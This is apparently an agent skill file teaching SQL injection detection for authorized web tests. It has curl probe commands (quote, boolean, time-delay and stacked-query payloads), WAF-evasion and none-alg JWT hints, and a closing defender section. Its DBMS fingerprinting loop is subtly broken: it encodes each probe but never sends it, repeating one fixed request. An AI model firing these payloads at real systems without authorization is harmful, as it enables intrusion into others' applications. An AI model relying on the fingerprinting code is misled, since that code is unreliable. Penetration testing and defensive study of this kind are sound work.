---
name: sqli-detection
description: Use when you need to find and confirm SQL injection points in a
  web application during an authorized test. Covers input mapping across GET,
  POST, cookies, headers, and JSON bodies, quote and boolean probes,
  error-based versus blind confirmation, DBMS fingerprinting, and evidence
  logging. Use when a parameter, form field, or API input may be injectable,
  when a scanner flags a possible injection, or when you must confirm the
  injection class before choosing an extraction technique.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [web-xss, api-security-testing]
tools:
  - name: curl
    version: 8.5
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

SQL injection detection is the disciplined process of proving that user input
reaches a database query unsafely, before any data is extracted. This skill
covers the detection half of the web-sqli methodology: mapping every input
that can reach the application, sending minimal probes that reveal injectable
behavior, distinguishing error-based, boolean-blind, and time-blind
confirmation, and fingerprinting the database engine. It stops at confirmed,
classified injection; extraction belongs to the sibling sub-skills. Every
probe here assumes written authorization for the target.

## Quick Workflow

1. Inventory every input: URL parameters, form fields, cookies, custom
   headers, and JSON or XML body fields.
2. Capture a clean baseline response for each input (status, length, key
   strings).
3. Send quote probes (`'`, `"`, `')`) one at a time and diff against the
   baseline.
4. Send boolean probes (`AND 1=1` versus `AND 1=2`) to confirm logic-based
   injection when errors are hidden.
5. Send time probes (`SLEEP`, `pg_sleep`, `WAITFOR DELAY`) when the page
   never changes.
6. Fingerprint the DBMS from error text, function behavior, and comment
   syntax.
7. Classify the injection (error-based, UNION-capable, boolean blind, time
   blind, stacked) and hand the confirmed point to the extraction sub-skill
   with full notes.

## 1. Input mapping

List inputs before probing anything. Missed inputs are missed injections.

```bash
# Enumerate URL parameters on a target page
curl -s 'https://target.example/item?id=5&cat=books' -D /tmp/hdrs.txt \
  -o /tmp/base.html
wc -c /tmp/base.html && grep -i '^set-cookie' /tmp/hdrs.txt

# Record a POST baseline (save the exact request for replay)
curl -s -X POST 'https://target.example/login' \
  -d 'user=admin&pass=test123' -o /tmp/login_base.html -w '%{http_code}\n'

# Baseline a JSON API endpoint
curl -s -X POST 'https://target.example/api/search' \
  -H 'Content-Type: application/json' \
  -d '{"q":"laptop","page":1}' -o /tmp/api_base.json
cat /tmp/api_base.json
```

Proxy everything through Burp so every request and response is logged for the
report. Note which inputs are reflected, stored, or used in redirects; stored
inputs need second-order checks later.

## 2. Error-based probes

Cheap quote probes come first. One request per probe, diffed against the
baseline.

```bash
# Single quote: database error text or a visibly broken page means injectable
curl -s "https://target.example/item?id=5'" -o /tmp/q1.html
diff /tmp/base.html /tmp/q1.html | head -20
grep -i -E 'sql syntax|mysql|ora-|psql|sqlite|odbc|jdbc' /tmp/q1.html | head -5

# Double quote and closing-parenthesis variants
curl -s 'https://target.example/item?id=5%22' | grep -i -c 'error'
curl -s "https://target.example/item?id=5')--%20-" -o /tmp/q2.html

# POST field probe
curl -s -X POST 'https://target.example/login' \
  -d "user=admin'&pass=x" | grep -i -E 'sql|syntax|warning' | head -5

# Cookie probe (logging code often injects cookies into queries)
curl -s 'https://target.example/' -b "prefs=theme'" | grep -i -E 'sql|error' | head -3

# Header probe
curl -s 'https://target.example/' -H "X-Forwarded-For: 1.2.3.4'" \
  | grep -i -E 'sql|error' | head -3
```

Read the error text carefully. MySQL errors mention `mysql`, PostgreSQL
mentions `PG::` or `psql`, MSSQL mentions `ODBC` or `SqlException`, Oracle
mentions `ORA-`, SQLite mentions `sqlite`. The error dialect is your first
DBMS fingerprint.

## 3. Boolean and time confirmation

When the application hides errors, confirm with logic or timing differences.

```bash
# Boolean: true condition returns the normal page, false returns a different one
curl -s "https://target.example/item?id=5%20AND%201%3D1" -o /tmp/true.html
curl -s "https://target.example/item?id=5%20AND%201%3D2" -o /tmp/false.html
diff /tmp/true.html /tmp/false.html | head -10
echo "true: $(wc -c < /tmp/true.html) bytes, false: $(wc -c < /tmp/false.html) bytes"

# Time-based: 4 second delay on the true branch only
time curl -s "https://target.example/item?id=5%20AND%20IF(1%3D1,SLEEP(4),0)--%20-" -o /dev/null
time curl -s "https://target.example/item?id=5" -o /dev/null

# PostgreSQL and MSSQL time variants
time curl -s "https://target.example/item?id=5%3BSELECT%20pg_sleep(4)--%20-" -o /dev/null
time curl -s "https://target.example/item?id=5%3BWAITFOR%20DELAY%20'0:0:4'--%20-" -o /dev/null
```

A consistent, repeatable difference on the boolean pair confirms injection.
A delay that appears only with the true branch confirms time-based
injection. Run each probe twice to rule out network jitter before calling it
confirmed.

## 4. DBMS fingerprinting

Knowing the engine picks the right extraction syntax. Combine these signals.

```bash
# String concatenation behavior differs per engine
# MySQL uses CONCAT, MSSQL uses +, Oracle uses ||, Postgres uses ||
curl -s "https://target.example/item?id=5%20AND%20'1'%3D'1" -o /dev/null -w '%{http_code}\n'

# Version functions that only work on one engine at a time
for probe in "version()" "@@version" "sqlite_version()"; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$probe")
  echo -n "$probe: "
  curl -s "https://target.example/item?id=5%20AND%201%3D1%20--%20-" -o /dev/null -w '%{http_code}\n'
done

# Comment syntax that succeeds tells you the engine family
# MySQL: --<space> and #, MSSQL: --, Oracle: --, Postgres: --
curl -s "https://target.example/item?id=5%23" -o /dev/null -w 'hash: %{http_code}\n'
```

Record the evidence for each conclusion: exact request, exact response
difference, and timestamp. The report needs proof of confirmation, not just
the claim.

## Edge cases

- The application strips quotes but is still injectable through numeric
  context. Test `5 AND 1=1` without any quote characters before ruling the
  parameter out.
- A WAF returns HTTP 403 on probes. Note the block, then test whether the
  block is signature-based (try case variation and encoding) or behavioral,
  and stay inside the agreed test window.
- JSON fields need the quote inside valid JSON. Probe with
  `{"q":"laptop'"}` and watch for a 500 or a changed result set, not just
  error text.
- The page differences come from CSRF tokens or timestamps, not your probe.
  Normalize the baseline (strip tokens) before diffing, or compare response
  lengths across repeated identical requests first.
- Second-order injection shows nothing at the injection point. Register
  quoted values, then crawl profile, admin, and reporting pages that display
  them.

## Escalation

- Error probes return identical pages: move to boolean probes, then time
  probes, in that order of cost.
- Boolean probes show no difference but timing is unstable: increase the
  delay to 8 seconds and compare medians over five runs instead of single
  samples.
- You suspect injection but cannot confirm the class: hand the raw
  request to sqlmap with `--batch` and let its heuristic battery run, then
  verify any finding manually.
- The parameter is inside a JWT or signed blob: check whether the signature
  is validated (try unsigned or none-alg tokens) before assuming the input
  is unreachable.

## Detection and defender view

Defenders see detection as scattered requests carrying single quotes,
boolean expressions, and timing functions, usually from one source IP in a
short window. Database error strings in application logs are the clearest
signal that probes are landing. Rate limiting, a WAF in blocking mode, and
generic error pages raise the cost of detection but do not stop boolean and
time-based confirmation. Durable defense is parameterized queries everywhere
and centralized logging of database errors with alerting.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- CWE-209 (Generation of Error Message Containing Sensitive Information).
- OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).
- PortSwigger Web Security Academy: SQL injection cheat sheet.
